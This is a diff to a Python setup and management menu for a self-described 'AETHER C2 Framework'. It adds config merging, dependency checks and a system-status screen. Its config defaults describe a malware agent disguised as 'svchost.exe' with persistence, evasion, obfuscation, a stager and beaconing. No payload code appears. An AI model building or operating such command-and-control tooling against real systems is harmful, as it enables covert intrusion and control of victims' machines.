@@ -52,14 +52,51 @@ def print_info(text):
     print(f"{Colors.OKCYAN}ℹ️ {text}{Colors.ENDC}")
 
 def load_config():
-    """Load config.json"""
+    """Load config.json and ensure all sections exist"""
     try:
         with open('config.json', 'r') as f:
-            return json.load(f)
+            config = json.load(f)
     except FileNotFoundError:
-        return {}
+        config = {}
     except json.JSONDecodeError:
-        return {}
+        config = {}
+    
+    # Ensure all required sections exist
+    defaults = {
+        'c2': {
+            'host': '0.0.0.0',
+            'port': 443,
+            'encryption_key': '',
+            'beacon_interval': 30
+        },
+        'agent': {
+            'process_name': 'svchost.exe',
+            'persistence': True,
+            'evasion': True
+        },
+        'builder': {
+            'obfuscation': True,
+            'icon_path': ''
+        },
+        'stager': {
+            'type': 'exe'
+        },
+        'whatsapp': {
+            'enabled': False,
+            'api_key': ''
+        }
+    }
+    
+    for section, values in defaults.items():
+        if section not in config:
+            config[section] = values
+        else:
+            # Merge with defaults for missing keys
+            for key, value in values.items():
+                if key not in config[section]:
+                    config[section][key] = value
+    
+    return config
 
 def save_config(config):
     """Save config.json"""
@@ -92,32 +129,106 @@ def find_python():
 
 def check_dependencies():
     """Check if all dependencies are installed"""
-    print_info("Checking Python dependencies...")
+    print("\n" + "="*80)
+    print("DEPENDENCY STATUS".center(80))
+    print("="*80 + "\n")
     
+    all_good = True
+    
+    # Check Python
+    python = find_python()
+    if python:
+        try:
+            result = subprocess.run(
+                [python, '--version'],
+                capture_output=True,
+                text=True
+            )
+            print_success(f"Python: {result.stdout.strip()}")
+        except:
+            print_error("Python: Not found")
+            all_good = False
+    else:
+        print_error("Python: Not found")
+        all_good = False
+    
+    # Check Python packages
+    print_info("\nChecking critical Python packages...")
+    critical_packages = ['requests', 'flask', 'pino']
+    
+    for package in critical_packages:
+        try:
+            result = subprocess.run(
+                ['pip', 'show', package],
+                capture_output=True,
+                timeout=5
+            )
+            if result.returncode == 0:
+                version_line = [l for l in result.stdout.decode().split('\n') if l.startswith('Version:')]
+                version = version_line[0].split(':')[1].strip() if version_line else 'unknown'
+                print_success(f"  {package}: {version}")
+            else:
+                print_warning(f"  {package}: Not installed")
+        except:
+            print_warning(f"  {package}: Unable to check")
+    
+    # Check Node.js
+    print_info("\nChecking Node.js...")
     try:
         result = subprocess.run(
-            ['pip', 'show', 'pino'],
+            ['node', '--version'],
             capture_output=True,
+            text=True,
             timeout=5
         )
-        if result.returncode != 0:
-            print_warning("Some Python dependencies may be missing")
-            return False
+        if result.returncode == 0:
+            print_success(f"Node.js: {result.stdout.strip()}")
+        else:
+            print_warning("Node.js: Not found (optional, only needed for WhatsApp bot)")
     except:
-        pass
+        print_warning("Node.js: Not found (optional, only needed for WhatsApp bot)")
     
-    print_success("Python dependencies appear installed")
+    # Check npm
+    try:
+        result = subprocess.run(
+            ['npm', '--version'],
+            capture_output=True,
+            text=True,
+            timeout=5
+        )
+        if result.returncode == 0:
+            print_success(f"npm: {result.stdout.strip()}")
+        else:
+            print_warning("npm: Not found (optional)")
+    except:
+        print_warning("npm: Not found (optional)")
     
-    # Check Node.js dependencies
-    print_info("Checking Node.js dependencies...")
+    # Check Node modules
+    print_info("\nChecking Node.js dependencies...")
     if os.path.exists('WA-BOT-Base/node_modules'):
-        print_success("Node.js dependencies appear installed")
+        count = len([d for d in os.listdir('WA-BOT-Base/node_modules') if os.path.isdir(os.path.join('WA-BOT-Base/node_modules', d))])
+        print_success(f"Node modules: {count} packages installed")
     else:
-        print_warning("Node.js dependencies not installed in WA-BOT-Base/")
-        print_info("Run: cd WA-BOT-Base && npm install")
-        return False
+        print_warning("Node modules: Not installed")
+        print_info("  Run: cd WA-BOT-Base && npm install")
     
-    return True
+    # Check Python requirements
+    print_info("\nChecking requirements.txt...")
+    if os.path.exists('requirements.txt'):
+        with open('requirements.txt', 'r') as f:
+            reqs = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+        print_success(f"requirements.txt: {len(reqs)} dependencies listed")
+    else:
+        print_warning("requirements.txt: Not found")
+    
+    print("\n" + "="*80)
+    if all_good:
+        print_success("All critical dependencies installed!".center(80))
+    else:
+        print_warning("Some dependencies need attention - see above".center(80))
+    print("="*80 + "\n")
+    
+    return all_good
 
 def run_component_menu():
     """Menu to run different components"""
@@ -292,15 +403,115 @@ def start_all_components():
     elif choice == "2":
         start_whatsapp_bot()
     elif choice == "3":
-        print_info("Starting C2 Server in background...")
+        print_info("Note: This will run them sequentially. Use separate terminals for parallel.")
+        print_info("Starting C2 Server...")
         start_c2_server()
-        print_info("\nStarting Bot...")
-        start_whatsapp_bot()
+        print_info("\nNow start bot in another terminal with option [2]")
+    elif choice == "4":
+        return
+    else:
+        print_error("Invalid option")
     
     input("\nPress Enter to continue...")
 
+def show_system_status():
+    """Show system status and diagnostics"""
+    clear_screen()
+    print_header("System Status & Diagnostics")
+    
+    print("\n" + "="*80)
+    print("AETHER C2 SYSTEM STATUS".center(80))
+    print("="*80 + "\n")
+    
+    # Python status
+    python = find_python()
+    if python:
+        try:
+            result = subprocess.run([python, '--version'], capture_output=True, text=True)
+            print_success(f"Python: {result.stdout.strip()}")
+        except:
+            print_error("Python: Not accessible")
+    else:
+        print_error("Python: Not found")
+    
+    # Node.js status
+    try:
+        result = subprocess.run(['node', '--version'], capture_output=True, text=True, timeout=2)
+        if result.returncode == 0:
+            print_success(f"Node.js: {result.stdout.strip()}")
+        else:
+            print_warning("Node.js: Not found")
+    except:
+        print_warning("Node.js: Not found (optional)")
+    
+    # npm status
+    try:
+        result = subprocess.run(['npm', '--version'], capture_output=True, text=True, timeout=2)
+        if result.returncode == 0:
+            print_success(f"npm: {result.stdout.strip()}")
+        else:
+            print_warning("npm: Not found")
+    except:
+        print_warning("npm: Not found")
+    
+    # Configuration status
+    print("\n" + "-"*80)
+    config = load_config()
+    print_info("Configuration Status:")
+    
+    sections = ['c2', 'agent', 'builder', 'stager', 'whatsapp']
+    for section in sections:
+        if section in config:
+            print_success(f"  {section}: Configured")
+        else:
+            print_warning(f"  {section}: Not configured")
+    
+    # Files status
+    print("\n" + "-"*80)
+    print_info("Project Files:")
+    
+    required_files = [
+        ('server/aether_server.py', 'C2 Server'),
+        ('agent/aether_agent.py', 'Agent'),
+        ('builder/compile.py', 'Agent Builder'),
+        ('stager/stager.py', 'Stager'),
+        ('WA-BOT-Base/main.js', 'WhatsApp Bot'),
+        ('WA-BOT-Base/index.js', 'Bot Launcher'),
+    ]
+    
+    for file_path, name in required_files:
+        if os.path.exists(file_path):
+            size = os.path.getsize(file_path)
+            print_success(f"  {name}: {file_path} ({size} bytes)")
+        else:
+            print_error(f"  {name}: {file_path} (missing)")
+    
+    # Dependencies status
+    print("\n" + "-"*80)
+    print_info("Dependencies:")
+    
+    if os.path.exists('requirements.txt'):
+        with open('requirements.txt', 'r') as f:
+            reqs = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+        print_success(f"  Python: {len(reqs)} packages in requirements.txt")
+    else:
+        print_warning("  Python: requirements.txt not found")
+    
+    if os.path.exists('WA-BOT-Base/node_modules'):
+        count = len([d for d in os.listdir('WA-BOT-Base/node_modules') if os.path.isdir(os.path.join('WA-BOT-Base/node_modules', d))])
+        print_success(f"  Node.js: {count} packages installed")
+    else:
+        print_warning("  Node.js: node_modules not installed")
+    
+    print("\n" + "="*80 + "\n")
+    input("Press Enter to continue...")
+
 def main_menu():
     """Main menu"""
+    # Auto-repair config on startup
+    config = load_config()
+    save_config(config)
+    
     while True:
         clear_screen()
         print_header("AETHER C2 Framework - Setup & Management")
@@ -317,6 +528,7 @@ def main_menu():
         print("[7] Run Components")
         print("[8] View Full Configuration Guide")
         print("[9] Quick Start Guide")
+        print("[*] System Status")
         print("[0] Exit")
         
         choice = input(f"\n{Colors.BOLD}Select option: {Colors.ENDC}").strip()
@@ -342,6 +554,8 @@ def main_menu():
             show_deployment_guide()
         elif choice == "9":
             show_quick_start()
+        elif choice == "*":
+            show_system_status()
         elif choice == "0":
             print_success("Goodbye!")
             sys.exit(0)
@@ -428,24 +642,63 @@ def install_dependencies():
     print_header("Installing Dependencies")
     
     python = find_python()
+    if not python:
+        print_error("Python not found. Please install Python 3.8+")
+        input("\nPress Enter to continue...")
+        return
     
-    print_info("Installing Python dependencies...")
+    # Python dependencies
+    print_info("Installing Python dependencies from requirements.txt...")
     try:
-        subprocess.run([python, '-m', 'pip', 'install', '-r', 'requirements.txt'])
-        print_success("Python dependencies installed")
+        result = subprocess.run(
+            [python, '-m', 'pip', 'install', '--upgrade', 'pip'],
+            capture_output=True
+        )
+        if result.returncode == 0:
+            print_success("pip upgraded successfully")
+        
+        result = subprocess.run(
+            [python, '-m', 'pip', 'install', '-r', 'requirements.txt']
+        )
+        if result.returncode == 0:
+            print_success("✅ Python dependencies installed successfully")
+        else:
+            print_error("⚠️ Some Python dependencies may have failed")
     except Exception as e:
         print_error(f"Failed to install Python dependencies: {str(e)}")
     
+    # Node.js dependencies
     print_info("\nInstalling Node.js dependencies...")
     if os.path.exists('WA-BOT-Base'):
         try:
-            subprocess.run(['npm', 'install'], cwd='WA-BOT-Base')
-            print_success("Node.js dependencies installed")
+            result = subprocess.run(
+                ['npm', '--version'],
+                capture_output=True,
+                timeout=5
+            )
+            if result.returncode == 0:
+                npm_version = result.stdout.decode().strip()
+                print_success(f"npm {npm_version} found")
+                
+                result = subprocess.run(
+                    ['npm', 'install'],
+                    cwd='WA-BOT-Base'
+                )
+                if result.returncode == 0:
+                    print_success("✅ Node.js dependencies installed successfully")
+                else:
+                    print_error("⚠️ Some Node.js dependencies may have failed")
+            else:
+                print_error("npm not found. Please install Node.js from https://nodejs.org")
         except FileNotFoundError:
             print_error("npm not found. Please install Node.js from https://nodejs.org")
+            print_info("Once installed, you can run 'npm install' manually in WA-BOT-Base/")
         except Exception as e:
             print_error(f"Failed to install Node.js dependencies: {str(e)}")
+    else:
+        print_warning("WA-BOT-Base directory not found (optional)")
     
+    print_success("\n✅ Dependency installation complete!")
     input("\nPress Enter to continue...")
 
 def show_deployment_guide():
